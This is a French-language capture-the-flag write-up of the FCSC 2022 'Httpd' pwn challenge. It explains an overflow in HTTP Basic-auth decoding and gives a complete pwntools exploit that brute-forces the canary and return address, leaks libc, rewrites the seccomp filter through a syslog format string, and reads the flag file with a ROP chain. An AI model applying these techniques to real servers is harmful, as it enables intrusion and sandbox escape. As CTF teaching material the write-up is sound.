#### Httpd

était un challenge de pwn du FCSC 2022 donc..

plus ou moins inspiré du challenge protostar

https://www.youtube.com/watch?v=MBz5C9Wa6KM

ou un process fils doit exploiter le processus parent via une format string dans syslog.

Le challenge d'origine a été durci par une sandbox, et toutes les protections du binaire sont activées,

canary, PIE, etc...

la vulnerabilité du processus fils qui parse les headers HTTP, se trouve dans checkauth()

la chaine en base64 de l'authentification basic du header HTTP, n'est pas vérifiée en longueur

et est décodée dans un buffer char creds[256];

ce qui cause un buffer overflow..

On procèdera donc au début à un bruteforce du canary, et de la valeur de l'addresse de retour afin de contourner l'ASLR.

Une fois ce bruteforce exécuté, on connait donc l'addresse de mappage en mémoire du binaire du fils (et du parent par conséquent, car fork préserver les addresses de mapping)

On va envoyer un ROP dans le fils qui va réécrire une format string dans la chaine stockéee dans la shared memory partagée entre le fils et le parent..et qui sera envoyé dans syslog() pour logguée l'utilisateur se connectant..

grâce à cette format string , on modifie dans la .bss le seccomp en place pour authoriser le syscall open,

et on lit et dump le flag, maintenant qu'on peut écrire un ROP open read write classique..

comme dans cet exploit

```python
#!/usr/bin/env python
# -*- coding: utf-8 -*-
from pwn import *
import base64

context.update(arch="amd64", os="linux")
context.log_level = 'error'

exe = ELF("./httpd_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

if args.REMOTE:
  duration = 0.2
else:
  duration = 0.01

host, port = "challenges.france-cybersecurity-challenge.fr", "2058"

def genpayload(data):
  p = ''
  p += 'GET / HTTP/1.1\r\n'
  p += 'Host: ansimorons.com:8080\r\n'
  p += 'Connection: keep-alive\r\n'					# keep alive is important to keep connection open between payloads, (bool keepalive;  in struct shared)
  p += 'Authorization: Basic '+base64.b64encode(data)+'\r\n\r\n'
  return p


#--------------------------------------------------- START
print('bruteforcing canary...patience...')
canary = b'\x00'		# we already know that canary LSB is zero
if args.REMOTE:
  p = connect(host, port)
else:
  p = process(exe.path)
while(len(canary)<8):
  i = 0
  while (i<256):
    payload = b'admin:admin'.ljust(0x108,b'\x00')+ canary + p8(i)
    buff = ''
    p.send(genpayload(payload))
    buff=p.recvuntil('flag', timeout=duration)
    if 'Congrat' in buff:
      canary += p8(i)
      print('uptonow: '+hexdump(canary, total=False))
      i = 0
      break
    i += 1

canary += 'A'*8+'\x9e'		# we already know return address lsb (0x9e)
while(len(canary)<24):
  i = 0
  while (i<256):
    payload = b'admin:admin'.ljust(0x108,b'\x00') + canary + p8(i)
    buff = ''
    p.send(genpayload(payload))
    buff=p.recvuntil('flag.',drop=True, timeout=duration)
    if 'Congrat' in buff:
      canary += p8(i)
      print('uptonow: '+hexdump(canary, total=False))
      i = 0
      break
    i += 1

# ok , after bruteforcing the return address, we can calculate the program base
prog = u64(canary[16:24]) - 0x289e
print('prog base = '+hex(prog))

exit_success = prog + 0x1663	# exit returning success
puts = prog + exe.sym['puts']
puts_got = prog + exe.got['puts']

set_csu = prog + 0x2a9a
call_csu = prog + 0x2a80
pop_rdi = prog + 0x0000000000002aa3 # pop rdi ; ret
pop_rsi = prog + 0x0000000000002aa1 # pop rsi ; pop r15 ; ret

def csucall(func,arg1,arg2,arg3):
  return p64(set_csu)+p64(0)+p64(1)+p64(arg1)+p64(arg2)+p64(arg3)+p64(func)+p64(call_csu)+p64(0)*7

# leak libc address from got
payload = b'admin:admin'.ljust(0x108,b'\x00') + canary[0:16]
payload += p64(pop_rdi)+p64(puts_got)+p64(puts)+p64(exit_success)
p.send(genpayload(payload))
libc.address = u64(p.recvuntil('\n',drop=True).ljust(8,'\x00')) - libc.sym['puts']
print('libc base = '+hex(libc.address))
binsh = libc.address + 0x1abf05

#---------------------------------
# libc gadgets that we will use
rop = ROP(libc)
pop_rdi = rop.find_gadget(['pop rdi', 'ret'])[0]
pop_rsi = rop.find_gadget(['pop rsi', 'ret'])[0]
pop_rdx = rop.find_gadget(['pop rdx', 'ret'])[0]
pop_rax = rop.find_gadget(['pop rax', 'ret'])[0]
syscall = rop.find_gadget(['syscall', 'ret'])[0]
xchg_eax_edi = libc.address + 0x0000000000097ac5 # xchg eax, edi ; ret
xchg_eax_edx = libc.address + 0x0000000000096716 # xchg eax, edx ; ret
bss = prog + + exe.bss(0xa00)

#---------------------------------------------------------------------------------------
# ebpf filter rewrite with the format string
#---------------------------------------------------------------------------------------
off_read = 0x503c
off_write = 0x5044
off_sigreturn = 0x504c
off_exit = 0x5054
off_brk = 0x505c

context.log_level = 'debug'

def set_bpf(offset,val):
  global prog
  return '%'+str(250+val)+'c%12$hhnAAAAAA'+p64(prog+offset)

# we change authorized sigreturn syscall in the ebpf filter, to open syscall
payload2 = set_bpf(off_sigreturn, 2)	# return success always
payload = b'admin:admin'.ljust(0x108,b'\x00') + canary[0:16]
# we read our format string into the shared memory zone, over the admin login..
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(libc.address + 0x1ed000+2) + p64(pop_rdx) + p64(len(payload2)) + p64(pop_rax)+p64(0)+p64(syscall)
payload += p64(exit_success)
p.send(genpayload(payload))
p.send(payload2)

#----------------------------------------------------------------------------
payload = b'admin:admin'.ljust(0x108,b'\x00') + canary[0:16] 
# file name we want to read
fname = 'flag.txt\x00'
# send data
#payload += p64(pop_rdx) + p64(0x10) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(prog) + p64(pop_rax) + p64(1) + p64(syscall)
# read filename and store it in the bss
payload += p64(pop_rdi) + p64(0) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(len(fname)) + p64(pop_rax)+p64(0)+p64(syscall)
# open filename
payload += p64(pop_rdi) + p64(bss) + p64(pop_rsi) + p64(0) + p64(pop_rax) + p64(2) + p64(syscall)
# read file
payload += p64(xchg_eax_edi) + p64(pop_rsi) + p64(bss) + p64(pop_rdx) + p64(0x200) + p64(pop_rax)+p64(0)+p64(syscall)
# dump it to stdout
payload += p64(xchg_eax_edx) + p64(pop_rdi) + p64(1) + p64(pop_rsi) + p64(bss) + p64(pop_rax) + p64(1) + p64(syscall) + p64(exit_success)

p.send(genpayload(payload))
#buff = p.recv(0x10)
p.send(fname)

print(hexdump(p.recv()))

p.interactive()

```

